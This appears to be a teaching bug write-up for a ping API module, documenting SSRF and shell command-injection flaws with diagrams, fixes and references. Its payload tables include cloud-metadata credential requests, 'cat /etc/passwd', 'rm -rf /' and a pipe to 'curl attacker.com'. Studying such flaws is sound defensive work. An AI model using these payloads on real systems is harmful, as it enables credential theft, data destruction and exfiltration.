# 06-BUGS.md — Ping API with Latency (M15)

## Bug 1: SSRF Vulnerability (No Private IP Blocking)

### WHAT

The buggy implementation does not validate the target before connecting. It allows pinging internal/private IPs, cloud metadata services, and localhost.

### WHY IT HAPPENS

The developer assumed that since the endpoint is for "external latency measurement," users would only provide public domains. No blocklist was implemented.

### ATTACK FLOW DIAGRAM

```
Attacker on Internet
       │
       │ GET /latency?target=169.254.169.254
       ▼
┌─────────────────┐
│   Your API      │
│   (buggy)       │
└────────┬────────┘
         │ No validation!
         ▼
┌─────────────────┐
│  AWS Metadata   │ ← Internal to AWS, not reachable from Internet
│  169.254.169.254│
└────────┬────────┘
         │ Returns IAM role credentials
         ▼
┌─────────────────┐
│   Your API      │
│  returns creds  │
└────────┬────────┘
         │
         ▼
    Attacker now has AWS credentials
```

### ATTACK PAYLOADS

| Payload | Target | Impact |
|---------|--------|--------|
| `?target=127.0.0.1` | Localhost | Probe local services (admin panels, debug endpoints) |
| `?target=192.168.1.1` | Home router | Map internal network |
| `?target=10.0.0.1` | Internal service | Access internal APIs |
| `?target=169.254.169.254` | AWS metadata | Leak IAM credentials |
| `?target=169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS role | Full AWS account takeover |

### REAL-WORLD BREACH

**Capital One (2019):** An SSRF vulnerability in a Web Application Firewall allowed an attacker to access the AWS metadata service at `169.254.169.254`. The attacker obtained IAM role credentials and exfiltrated data from 100 million customer accounts. The breach cost Capital One $190 million in settlements.

---

## Bug 2: Command Injection via `child_process.exec()`

### WHAT

The buggy implementation passes user input directly to `child_process.exec()` without sanitization. The shell interprets metacharacters as command separators.

### WHY IT HAPPENS

The developer wanted to use the system's `ping` command and chose `exec()` as the easiest wrapper. They did not understand that `exec()` invokes a shell (`/bin/sh`), which processes `;`, `&&`, `||`, `|`, backticks, and `$()` as control operators.

### ATTACK FLOW DIAGRAM

```
Attacker sends:
  GET /latency?target=google.com;cat /etc/passwd

Your server executes:
  sh -c "ping -c 1 google.com;cat /etc/passwd"

         ┌─────────────┐
         │   Shell     │
         │   (sh)      │
         └──────┬──────┘
                │
      ┌─────────┴─────────┐
      ▼                   ▼
┌─────────────┐    ┌─────────────┐
│ ping -c 1   │    │ cat /etc/   │
│ google.com  │    │ passwd      │
└─────────────┘    └──────┬──────┘
                          │
                          ▼
                    Returns /etc/passwd
                    to attacker
```

### ATTACK PAYLOADS

| Payload | Command Executed | Impact |
|---------|-----------------|--------|
| `google.com; cat /etc/passwd` | `ping -c 1 google.com; cat /etc/passwd` | File leak |
| `google.com && rm -rf /` | `ping -c 1 google.com && rm -rf /` | Data destruction |
| `google.com \| curl attacker.com` | `ping -c 1 google.com \| curl attacker.com` | Data exfiltration |
| `` google.com`whoami` `` | `` ping -c 1 google.com`whoami` `` | Command execution |
| `google.com$(cat /etc/passwd)` | `ping -c 1 google.com$(cat /etc/passwd)` | Command execution + file leak |

### THE FIX

**Never use shell APIs with user input.** Use pure Node.js networking:

```typescript
// WRONG
import { exec } from "node:child_process";
const { stdout } = await execAsync(`ping -c 1 ${target}`);

// RIGHT
import { lookup } from "node:dns/promises";
import net from "node:net";

const addresses = await lookup(host);
const ip = addresses.address;
// Validate ip against private ranges...
const socket = new net.Socket();
socket.connect(port, ip, () => { /* measure */ });
```

### WRONG vs RIGHT

| WRONG (Buggy) | RIGHT (Fixed) |
|---------------|---------------|
| `exec('ping -c 1 ' + target)` | `dns.promises.lookup()` + `net.Socket.connect()` |
| No SSRF protection | Hostname + IP blocklist |
| No timeout | 5-second socket timeout |
| Raw shell output | Structured JSON response |

## SOURCES

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- Capital One Data Breach, DOJ Press Release, 2019.
- PortSwigger, "Command Injection," 2023.
